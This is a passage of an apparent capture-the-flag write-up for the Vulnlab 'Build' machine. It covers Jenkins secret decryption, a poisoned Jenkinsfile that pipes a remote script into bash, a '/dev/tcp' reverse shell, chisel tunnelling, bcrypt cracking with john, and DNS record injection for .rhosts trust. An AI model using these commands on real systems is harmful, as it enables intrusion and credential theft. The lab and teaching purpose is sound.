+<h3 id="Cracking-jenkins"><a href="#Cracking-jenkins" class="headerlink" title="Cracking jenkins"></a>Cracking jenkins</h3><p>with that being discovered, we can now use <code>jenkins_offline_decrypt.py</code> from this github [<a class="link"   target="_blank" rel="noopener" href="https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py]" >https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> to retrieve the password and proceed with the pipeline exploitation.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/vulnlab/easy/Build~10.10.91.238$ python3 jenkins_offline_decrypt.py ./backups/jenkins_configuration/secrets/master.key ./backups/jenkins_configuration/secrets/hudson.util.Secret ./backups/jenkins_configuration/jobs/build/config.xml</span><br><span class="line">/home/muyi/Desktop/vulnlab/easy/Build~10.10.91.238/jenkins_offline_decrypt.py:124: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\&#123;&#x27;</span></span><br><span class="line">  secrets += re.findall(secret_title + <span class="string">&#x27;&gt;\&#123;?(.*?)\&#125;?&lt;/&#x27;</span> + secret_title, data)</span><br><span class="line">Git1234!</span><br></pre></td></tr></table></figure></div>
+<h3 id="Logging-into-Gitea"><a href="#Logging-into-Gitea" class="headerlink" title="Logging into Gitea"></a>Logging into Gitea</h3><p>using buildadm:Git1234!, successfully login into Gitea and may modify the <code>Jenkinsfile</code></p>
+<blockquote>
+<p>we now have the account of buildadm, further inspection leads to <a class="link"   href="mailto:&#x61;&#x64;&#x6d;&#105;&#110;&#x40;&#98;&#x75;&#x69;&#108;&#x64;&#46;&#x76;&#108;" >&#x61;&#x64;&#x6d;&#105;&#110;&#x40;&#98;&#x75;&#x69;&#108;&#x64;&#46;&#x76;&#108;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, which gives away the name of the domain.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/vulnlab-build/account-get.png"
+                      alt="account-get"
+                ></p>
+</blockquote>
+<p>before modifying the <code>Jenkinsfile</code>, check if the Jenkins instance is listening for changes in the repository by going to Settings -&gt; Webhooks<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/vulnlab-build/verifying-webhooks.png"
+                      alt="verifying-webhooks"
+                ></p>
+<p>clicking the link will redirect to the settings of the webhook<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/vulnlab-build/webhooks-inspection.png"
+                      alt="webhooks-inspection.png"
+                ><br>here, notice that the trigger event is on every push events. Meaning when there’s a commit on the repository, the gitea will make a POST request to the Jenkins instance.</p>
+<h3 id="Getting-rev-shells"><a href="#Getting-rev-shells" class="headerlink" title="Getting rev shells"></a>Getting rev shells</h3><p>modify the <code>Jenkinfiles</code> and save the changes</p>
+<div class="code-container" data-rel="Groovy"><figure class="iseeu highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pipeline &#123;</span><br><span class="line">    agent any</span><br><span class="line"></span><br><span class="line">    stages &#123;</span><br><span class="line">        stage(<span class="string">&#x27;revshell&#x27;</span>) &#123;</span><br><span class="line">            steps &#123;</span><br><span class="line">                sh <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                    curl http://10.8.5.50:8080/revshell.sh | bash</span></span><br><span class="line"><span class="string">                &#x27;&#x27;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>setup a listener at port 9999, here I used penelope. Host the <code>revshell.sh</code> at attacker machine:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/10.8.5.50/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>
+<h3 id="User-in-DOCKER"><a href="#User-in-DOCKER" class="headerlink" title="User in DOCKER"></a>User in DOCKER</h3><p>After, received a reverse shell at the listener as a root! But its a root inside a docker. So next step, docker escape</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/vulnlab/easy/Build~10.10.91.238$ penelope 9999 -i tun0</span><br><span class="line">[+] Listening <span class="keyword">for</span> reverse shells on 10.8.5.50:9999</span><br><span class="line">➤  💀 Show Payloads (p) 🏠 Main Menu (m) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</span><br><span class="line">[+] Got reverse shell from 🐧 10.10.91.238 😍️ - Assigned SessionID &lt;1&gt;</span><br><span class="line">[+] Attempting to upgrade shell to PTY...</span><br><span class="line">[!] Python agent cannot be deployed. I need to maintain at least one basic session...</span><br><span class="line">[+] Attempting to spawn a reverse shell on 10.8.5.50:9999</span><br><span class="line">[+] Got reverse shell from 🐧 10.10.91.238 😍️ - Assigned SessionID &lt;2&gt;</span><br><span class="line">[+] Attempting to upgrade shell to PTY...</span><br><span class="line">[+] Shell upgraded successfully using /usr/bin/script! 💪</span><br><span class="line">[+] Interacting with session [2], Shell Type: PTY, Menu key: F12</span><br><span class="line">[+] Logging to /home/muyi/.penelope/10.10.91.238/10.10.91.238.<span class="built_in">log</span> 📜</span><br><span class="line"></span><br><span class="line">root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# ^C</span><br><span class="line">root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# <span class="built_in">ls</span></span><br><span class="line">Jenkinsfile</span><br><span class="line">root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# <span class="built_in">ls</span> ~</span><br><span class="line">user.txt</span><br><span class="line">root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# <span class="built_in">cat</span> ~/user.txt</span><br><span class="line">VL&#123;********&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>from this, I know that we are inside a docker with the presence of &#x2F;.dockerenv</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@5ac6c7d6fb8e:~# <span class="built_in">ls</span> -a /</span><br><span class="line">.  ..  .dockerenv  bin  boot  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure></div>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Rhosts"><a href="#Rhosts" class="headerlink" title="Rhosts"></a>Rhosts</h3><p>at the ~ directory, discovered rhost file</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@5ac6c7d6fb8e:~# <span class="built_in">ls</span> -la</span><br><span class="line">total 9176</span><br><span class="line">drwxr-xr-x 3 root root    4096 Jan 21 08:35 .</span><br><span class="line">drwxr-xr-x 1 root root    4096 May  9  2024 ..</span><br><span class="line">lrwxrwxrwx 1 root root       9 May  1  2024 .bash_history -&gt; /dev/null</span><br><span class="line">-r-------- 1 root root      35 May  1  2024 .rhosts</span><br><span class="line">drwxr-xr-x 2 root root    4096 May  1  2024 .ssh</span><br><span class="line">-rwxr-xr-x 1 root root 9371800 Jan 21 08:36 chisel</span><br><span class="line">-rw------- 1 root root      37 May  1  2024 user.txt</span><br><span class="line">root@5ac6c7d6fb8e:~# <span class="built_in">cat</span> .rhosts</span><br><span class="line">admin.build.vl +</span><br><span class="line">intern.build.vl +</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>for this section, refer to <a class="link"   target="_blank" rel="noopener" href="https://blog.apolloteapot.com/vulnlab-build" >https://blog.apolloteapot.com/vulnlab-build<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> for further dissection of what rhost do</p>
+</blockquote>
+<h3 id="Docker’s-IP"><a href="#Docker’s-IP" class="headerlink" title="Docker’s IP"></a>Docker’s IP</h3><p>discovering the docker ip address [<a class="link"   target="_blank" rel="noopener" href="https://blog.oddbit.com/post/2015-03-08-converting-hexadecimal-ip-addr/]" >https://blog.oddbit.com/post/2015-03-08-converting-hexadecimal-ip-addr/]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@5ac6c7d6fb8e:~# hexaddr=$(awk <span class="string">&#x27;$2 == &quot;00000000&quot; &#123;print $3&#125;&#x27;</span> /proc/net/route)</span><br><span class="line">ipaddr=$(<span class="built_in">printf</span> <span class="string">&quot;%d.&quot;</span> $(</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$hexaddr</span> | sed <span class="string">&#x27;s/../0x&amp; /g&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;\n&#x27;</span> | <span class="built_in">tac</span></span><br><span class="line">  ) | sed <span class="string">&#x27;s/\.$/\n/&#x27;</span>)</span><br><span class="line">root@5ac6c7d6fb8e:~# <span class="built_in">echo</span> <span class="variable">$ipaddr</span></span><br><span class="line">172.18.0.1</span><br></pre></td></tr></table></figure></div>
+<h3 id="Reverse-Proxy-via-Chisel"><a href="#Reverse-Proxy-via-Chisel" class="headerlink" title="Reverse Proxy via Chisel"></a>Reverse Proxy via Chisel</h3><p>Next, I would need to setup a reverse SOCKS Proxy so that I can access the internal face server as docker-root</p>
+<ul>
+<li>upload <code>chisel</code> into the docker via any method</li>
+<li>change the permission so that it can be executed<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/tools/chisel$ chisel server --reverse --port 54321</span><br><span class="line">2025/01/21 16:01:22 server: Reverse tunnelling enabled</span><br><span class="line">2025/01/21 16:01:22 server: Fingerprint JTqSFjMr+ONvrQ8T0gtE2ogMYQ79Q3kkCMcPClcu5K0=</span><br><span class="line">2025/01/21 16:01:22 server: Listening on http://0.0.0.0:54321</span><br><span class="line"></span><br><span class="line">root@5ac6c7d6fb8e:~# ./chisel client 10.8.5.50:54321 R:socks</span><br><span class="line">2025/01/21 08:02:03 client: Connecting to ws://10.8.5.50:54321</span><br><span class="line">2025/01/21 08:02:06 client: Connected (Latency 204.060174ms)</span><br><span class="line"></span><br><span class="line"><span class="comment"># on /etc/proxychains4.conf, change the following line</span></span><br><span class="line">socks4   127.0.0.1 9050 --&gt; socks5   127.0.0.1 9050</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<p>Now, I can access as root using my attacker machine and connect to the sql service on port 3306</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Build~10.10.91.238$ proxychains mysql -h 172.18.0.1 -u root --skip-ssl</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.18.0.1:3306  ...  OK</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection <span class="built_in">id</span> is 37</span><br><span class="line">Server version: 11.3.2-MariaDB-1:11.3.2+maria~ubu2204 mariadb.org binary distribution</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Support MariaDB developers by giving a star at https://github.com/MariaDB/server</span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="MariaDB-enumeration"><a href="#MariaDB-enumeration" class="headerlink" title="MariaDB enumeration"></a>MariaDB enumeration</h3><div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> <span class="keyword">show</span> databases;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> Database           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> performance_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> powerdnsadmin      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sys                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.199</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> use powerdnsadmin;</span><br><span class="line">Reading <span class="keyword">table</span> information <span class="keyword">for</span> completion <span class="keyword">of</span> <span class="keyword">table</span> <span class="keyword">and</span> <span class="keyword">column</span> names</span><br><span class="line">You can turn off this feature <span class="keyword">to</span> <span class="keyword">get</span> a quicker startup <span class="keyword">with</span> <span class="operator">-</span>A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [powerdnsadmin]<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_powerdnsadmin <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span> account                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> account_user            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> alembic_version         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> apikey                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> apikey_account          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> comments                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cryptokeys              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> domain                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> domain_apikey           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> domain_setting          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> domain_template         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> domain_template_record  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> domain_user             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> domainmetadata          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> domains                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> history                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> records                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> role                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sessions                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> setting                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> supermasters            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tsigkeys                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>                    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="number">23</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.285</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [powerdnsadmin]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> records;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> domain_id <span class="operator">|</span> name                 <span class="operator">|</span> type <span class="operator">|</span> content</span><br><span class="line">                    <span class="operator">|</span> ttl  <span class="operator">|</span> prio <span class="operator">|</span> disabled <span class="operator">|</span> ordername <span class="operator">|</span> auth <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">8</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> db.build.vl          <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.4</span></span><br><span class="line">                    <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">9</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> gitea.build.vl       <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">                    <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> intern.build.vl      <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">                    <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> jenkins.build.vl     <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.3</span></span><br><span class="line">                    <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> pdns<span class="operator">-</span>worker.build.vl <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.5</span></span><br><span class="line">                    <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">13</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> pdns.build.vl        <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.6</span></span><br><span class="line">                    <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">14</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> build.vl             <span class="operator">|</span> SOA  <span class="operator">|</span> a.misconfigured.dns.server.invalid hostmaster.build.vl <span class="number">2024050201</span> <span class="number">10800</span> <span class="number">3600</span> <span class="number">604800</span> <span class="number">3600</span> <span class="operator">|</span> <span class="number">1500</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span></span><br><span class="line"><span class="number">7</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.275</span> sec)</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [powerdnsadmin]<span class="operator">&gt;</span> <span class="keyword">select</span> username,password,email <span class="keyword">from</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------------------------------------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> password                                                     <span class="operator">|</span> email          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------------------------------------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> admin    <span class="operator">|</span> $<span class="number">2</span>b$<span class="number">12</span>$s1hK0o7YNkJGfu5poWx<span class="number">.0</span>u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq <span class="operator">|</span> admin<span class="variable">@build</span>.vl <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------------------------------------------+----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.296</span> sec)</span><br></pre></td></tr></table></figure></div>
+<p>crack the password</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~$ john <span class="built_in">hash</span> --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 4096 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 12 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">winston          (?)</span><br><span class="line">1g 0:00:00:17 DONE (2025-01-21 17:03) 0.05847g/s 82.10p/s 82.10c/s 82.10C/s winston..harry</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure></div>
+
+
+<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>Exploitation [<a class="link"   target="_blank" rel="noopener" href="https://cyfisher.dev/p/build/]" >https://cyfisher.dev/p/build/]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<ul>
+<li>since I have access to the MariaDB which handles the database of the PowerDNS at port 8081</li>
+<li>I can straight insert the data into the table without being authenticated into the website<ul>
+<li>mostly because for the entire session using proxychains, I failed to perform nmap for unknown reasons</li>
+</ul>
+</li>
+</ul>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [powerdnsadmin]<span class="operator">&gt;</span> <span class="keyword">INSERT INTO</span> powerdnsadmin.records (domain_id, name, type, content, ttl, prio, disabled, ordername, auth) <span class="keyword">VALUES</span> ((<span class="keyword">SELECT</span> id <span class="keyword">FROM</span> powerdnsadmin.domains <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;build.vl&#x27;</span>), <span class="string">&#x27;admin.build.vl&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;10.8.5.50&#x27;</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="keyword">NULL</span>, <span class="number">1</span>);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.203</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [powerdnsadmin]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> records;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> domain_id <span class="operator">|</span> name                 <span class="operator">|</span> type <span class="operator">|</span> content                                                                                  <span class="operator">|</span> ttl  <span class="operator">|</span> prio <span class="operator">|</span> disabled <span class="operator">|</span> ordername <span class="operator">|</span> auth <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span></span><br><span class="line"><span 